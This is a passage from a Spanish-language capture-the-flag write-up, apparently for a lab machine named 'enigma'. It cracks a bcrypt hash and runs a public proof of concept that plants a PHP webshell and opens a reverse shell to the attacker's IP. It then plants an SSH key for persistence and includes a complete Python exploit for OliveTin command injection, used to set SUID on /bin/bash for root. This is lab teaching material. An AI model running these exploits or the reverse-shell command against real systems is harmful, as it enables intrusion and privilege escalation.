+haris:$2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC</code></pre>
+
+                <p>El hash de <code>haris</code> crackea con un diccionario:</p>
+                <pre><code class="language-plaintext">$2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC:bestfriends</code></pre>
+
+                <p>Con estas credenciales puedo acceder a Roundcube y OpenSTAManager como haris, pero no hay nada
+                    especialmente útil en ninguno de los dos, y SSH solo admite autenticación con clave pública así
+                    que no puedo entrar directamente por ahí.</p>
+
+                <h2>Acceso Inicial - RCE en OpenSTAManager (CVE-2026-38751)</h2>
+                <p>Siguiendo buscando vulnerabilidades encuentro este advisory:
+                    <a href="https://advisories.gitlab.com/composer/devcode-it/openstamanager/CVE-2026-38751/">CVE-2026-38751</a>.
+                </p>
+
+                <p>OpenSTAManager es vulnerable a RCE mediante subida arbitraria de archivos. La funcionalidad de
+                    instalación de módulos no valida el contenido de los ZIP subidos, y como los ficheros PHP se
+                    colocan en un directorio accesible desde la web, se puede colocar una webshell PHP — la idea es
+                    prácticamente idéntica a subir un plugin malicioso en WordPress.</p>
+
+                <p>Uso un script PoC público que automatiza la autenticación, la subida del módulo y dispara la reverse
+                    shell:</p>
+
+                <pre><code class="language-bash">python3 cve.py -u http://support_001.enigma.htb -U admin -P Ne3s4rtars78s --lhost 10.10.14.169 --lport 443</code></pre>
+                <pre><code class="language-plaintext">[ CVE-2026-38751 — OpenSTAManager RCE ]
+[*] Target: http://support_001.enigma.htb
+[*] 1/4 Authenticating...
+[+] Authenticated as: admin
+[*] 2/4 Enabling module updates...
+[+] Module updates enabled
+[*] 3/4 Uploading malicious module...
+[*] Malicious ZIP built in memory
+[*] Upload → HTTP 500
+[*] 4/4 Verifying webshell...
+[+] Webshell active: http://support_001.enigma.htb/modules/shell/shell.php
+[*] Sending payload to 10.10.14.169:443</code></pre>
+
+                <p>Consigo una reverse shell como <code>www-data</code>. Desde aquí puedo pivotar lateralmente: el
+                    usuario <code>haris</code> existe en la máquina, y la contraseña crackeada <code>bestfriends</code>
+                    sirve para hacer <code>su haris</code>. Aquí obtengo la flag de usuario.</p>
+
+                <p>Para facilitar las cosas y establecer persistencia, dejo mi clave pública SSH en
+                    <code>/home/haris/.ssh/authorized_keys</code>.</p>
+
+                <h2>Enumeración Local - OliveTin</h2>
+                <p>Investigando la máquina veo este puerto abierto localmente:</p>
+                <pre><code class="language-plaintext">tcp   LISTEN 0  4096  127.0.0.1:1337  0.0.0.0:*</code></pre>
+
+                <p>Con <code>curl</code> desde la propia máquina no veo mucha información, así que uso port forwarding
+                    local por SSH para investigarlo cómodamente desde mi máquina atacante:</p>
+
+                <pre><code class="language-bash">ssh haris@enigma.htb -i ~/.ssh/kerssh -L 1337:localhost:1337</code></pre>
+
+                <p>El servicio resulta ser <strong>OliveTin</strong>, una herramienta open source que da acceso web
+                    seguro y sencillo a comandos shell predefinidos. La versión que corre es
+                    <strong>3000.10.0</strong>. Sin credenciales válidas de login no parece haber nada que pueda
+                    hacer directamente desde la UI.</p>
+
+                <h2>Escalada de Privilegios - Inyección de Comandos en OliveTin (CVE-2026-27626)</h2>
+                <p>Buscando vulnerabilidades conocidas encuentro un CVE crítico reciente que afecta a esta versión:
+                    <a href="https://nvd.nist.gov/vuln/detail/CVE-2026-27626">CVE-2026-27626</a>.</p>
+
+                <blockquote>
+                    <p>"OliveTin gives access to predefined shell commands from a web interface. In versions up to
+                        and including 3000.10.0, OliveTin's shell mode safety check
+                        (<code>checkShellArgumentSafety</code>) blocks several dangerous argument types but not
+                        <code>password</code>. A user supplying a <code>password</code>-typed argument can inject
+                        shell metacharacters that execute arbitrary OS commands."</p>
+                </blockquote>
+
+                <p>Esto significa que cualquier petición que acepte un argumento de tipo password podría ser vulnerable
+                    a inyección de comandos. Investigando la API de OliveTin encuentro que el endpoint:</p>
+
+                <pre><code class="language-plaintext">/api/olivetin.api.v1.OliveTinApiService/StartAction</code></pre>
+
+                <p>acepta un body JSON con argumentos, donde <code>db_pass</code> parece inyectable:</p>
+
+                <pre><code class="language-python">payload = {
+    "bindingId": "backup_database",
+    "arguments": [
+        {"name": "db_user", "value": "backup_svc"},
+        {"name": "db_pass", "value": f"';{cmd};'"},
+        {"name": "db_name", "value": "production"}
+    ],
+    "uniqueTrackingId": tracking_id
+}</code></pre>
+
+                <p>La salida del comando ejecutado se puede recuperar desde otro endpoint:</p>
+                <pre><code class="language-plaintext">/api/olivetin.api.v1.OliveTinApiService/ExecutionStatus</code></pre>
+
+                <p>Envuelvo todo esto en un pequeño script de explotación:</p>
+
+                <pre><code class="language-python">#!/usr/bin/env python3
+import argparse
+import json
+import sys
+import uuid
+import time
+import requests
+import urllib3
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+def start_action(base_url, tracking_id, cmd):
+    url = f"{base_url}/api/olivetin.api.v1.OliveTinApiService/StartAction"
+    payload = {
+        "bindingId": "backup_database",
+        "arguments": [
+            {"name": "db_user", "value": "backup_svc"},
+            {"name": "db_pass", "value": f"';{cmd};'"},
+            {"name": "db_name", "value": "production"}
+        ],
+        "uniqueTrackingId": tracking_id
+    }
+    r = requests.post(url, json=payload, verify=False, timeout=10)
+    r.raise_for_status()
+    return r.json()["executionTrackingId"]
+
+def execution_status(base_url, tracking_id):
+    url = f"{base_url}/api/olivetin.api.v1.OliveTinApiService/ExecutionStatus"
+    payload = {"executionTrackingId": tracking_id}
+    r = requests.post(url, json=payload, verify=False, timeout=10)
+    r.raise_for_status()
+    return r.json()
+
+def print_output(resp):
+    try:
+        output = resp["logEntry"]["output"]
+    except KeyError:
+        print(json.dumps(resp, indent=4))
+        return
+    print("=" * 70)
+    print("Command Output")
+    print("=" * 70)
+    print(output.rstrip())
+    print("=" * 70)
+
+def main():
+    parser = argparse.ArgumentParser(description="OliveTin CVE")
+    parser.add_argument("-u", "--url", required=True, help="Target host/IP")
+    parser.add_argument("-p", "--port", default=1337, type=int, help="Target port (default: 1337)")
+    parser.add_argument("-x", "--cmd", default="id", help="Command to execute (default: id)")
+    args = parser.parse_args()
+
+    host = args.url.rstrip("/")
+    if not host.startswith("http://") and not host.startswith("https://"):
+        host = "http://" + host
+    base_url = f"{host}:{args.port}"
+    tracking_id = str(uuid.uuid4())
+
+    try:
+        execution_id = start_action(base_url, tracking_id, args.cmd)
+        print(f"[+] Execution ID: {execution_id}")
+        time.sleep(2)
+        response = execution_status(base_url, execution_id)
+        print_output(response)
+    except requests.exceptions.RequestException as e:
+        print(f"[-] Request failed: {e}")
+        sys.exit(1)
+    except Exception as e:
+        print(f"[-] Error: {e}")
+        sys.exit(1)
+
+if __name__ == "__main__":
+    main()</code></pre>
+
+                <p>Como OliveTin corre como root, cualquier comando inyectado se ejecutará con privilegios de root.
+                    Le pongo el bit SUID a <code>/bin/bash</code>:</p>
+
+                <pre><code class="language-bash">python3 olivepoc.py -u http://localhost -p 1337 -x "chmod u+s /bin/bash"</code></pre>
+                <pre><code class="language-plaintext">[+] Execution ID: 3567fa3d-d024-4c0a-ae17-108fffde1a68
+======================================================================
+Command Output
+======================================================================
+exit status 2
+======================================================================</code></pre>
+
+                <p>A pesar del "exit status 2" del comando envolvente, el <code>chmod</code> inyectado sí que se
+                    ejecutó. Verifico:</p>
+                <pre><code class="language-bash">haris@enigma:~/.ssh$ ls -lah /bin/bash</code></pre>
+                <pre><code class="language-plaintext">-rwsr-xr-x 1 root root 1.4M Mar 31  2024 /bin/bash</code></pre>
+
+                <p>Bash tiene ahora el bit SUID activado. Ejecutando <code>bash -p</code> se preserva el EUID como
+                    root, dándome una shell privilegiada y la flag de root:</p>
+
+                <pre><code class="language-bash">bash -p
+id
+# uid=1001(haris) gid=1001(haris) euid=0(root) groups=1001(haris)</code></pre>
+            </div>
+        </article>
+    </main>
+    <script src="../../index.js"></script>
+</body>
+
+</html>
